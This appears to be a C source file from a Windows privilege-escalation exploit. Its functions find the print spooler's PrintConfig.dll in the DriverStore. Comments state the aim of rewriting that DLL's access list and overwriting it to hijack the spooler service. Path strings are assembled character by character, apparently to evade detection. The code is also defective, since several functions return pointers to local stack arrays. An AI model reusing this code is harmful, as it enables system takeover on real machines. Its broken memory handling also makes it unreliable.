#include <Windows.h>
#include <wchar.h>


// TODO: change to W and A variants

wchar_t* wcscat(
	wchar_t* const destination,
	wchar_t const* source
)
{
	wchar_t* destination_it = destination;

	// Find the end of the destination string:
	while (*destination_it)
		++destination_it;

	// Append the source string to the destination string:
	while ((*destination_it++ = *source++) != L'\0') {}

	return destination;
}

// TODO: x86 variant
// Example PrintConfig.dll paths
// C:\windows\System32\DriverStore\FileRepository\prnms003.inf_amd64_d953309ec763fcc7\Amd64\PrintConfig.dll
// C:\windows\System32\DriverStore\FileRepository\prnms003.inf_x86_5b0184fdd4027e3f\I386\PrintConfig.dll
wchar_t* GetTargetDirectoryWithoutSlash(void)
{
	//We enumerate the path of PrintConfig.dll, which we will write the DACL of and overwrite to hijack the print spooler service
	//You might want to expand this code block with FindNextFile .. as there may be multiple prnms003.inf_amd64* folders since older versions do not get cleaned up it in some rare cases.
	//When this happens this code has no garantuee that it will target the dll that ends up getting loaded... and you really want to avoid this.
	wchar_t BeginPath[MAX_PATH] = {L'c',L':',L'\\',L'w',L'i',L'n',L'd',L'o',L'w',L's',L'\\',L's',L'y',L's',L't',L'e',L'm',L'3',L'2',L'\\',L'D',L'r',L'i',L'v',L'e',L'r',L'S',L't',L'o',L'r',L'e',L'\\',L'F',L'i',L'l',L'e',L'R',L'e',L'p',L'o',L's',L'i',L't',L'o',L'r',L'y',L'\\',0};
	wchar_t FindQuery[] = {L'c',L':',L'\\',L'w',L'i',L'n',L'd',L'o',L'w',L's',L'\\',L's',L'y',L's',L't',L'e',L'm',L'3',L'2',L'\\',L'D',L'r',L'i',L'v',L'e',L'r',L'S',L't',L'o',L'r',L'e',L'\\',L'F',L'i',L'l',L'e',L'R',L'e',L'p',L'o',L's',L'i',L't',L'o',L'r',L'y',L'\\',L'p',L'r',L'n',L'm',L's',L'0',L'0',L'3',L'.',L'i',L'n',L'f',L'_',L'a',L'm',L'd',L'6',L'4',L'*',0};
	wchar_t PrinterDriverFolder[MAX_PATH] = {0};
	wchar_t EndPath[] = {L'\\',L'A',L'm',L'd',L'6',L'4',0};
	WIN32_FIND_DATAW FindFileData;
	HANDLE hFind = FindFirstFileW(FindQuery, &FindFileData);
	wcscat(PrinterDriverFolder, FindFileData.cFileName);
	wcscat(BeginPath, PrinterDriverFolder);
	wcscat(BeginPath, EndPath);
	FindClose(hFind);
	return BeginPath;
}

wchar_t* GetTargetDirectory(void)
{
	wchar_t target_dir[MAX_PATH] = {0};
	wchar_t slash[] = {L'\\', 0};
	wcscat(target_dir, GetTargetDirectoryWithoutSlash());
	wcscat(target_dir, slash);
	return target_dir;
}

wchar_t* GetTargetFilename(void)
{
	wchar_t target_filename[] = {L'P',L'r',L'i',L'n',L't',L'C',L'o',L'n',L'f',L'i',L'g',L'.',L'd',L'l',L'l',0};
	return target_filename;
}

wchar_t* GetTargetPath(void)
{
	wchar_t target_path[MAX_PATH] = {0};
	wcscat(target_path, GetTargetDirectory());
	wcscat(target_path, GetTargetFilename());
	return target_path;
}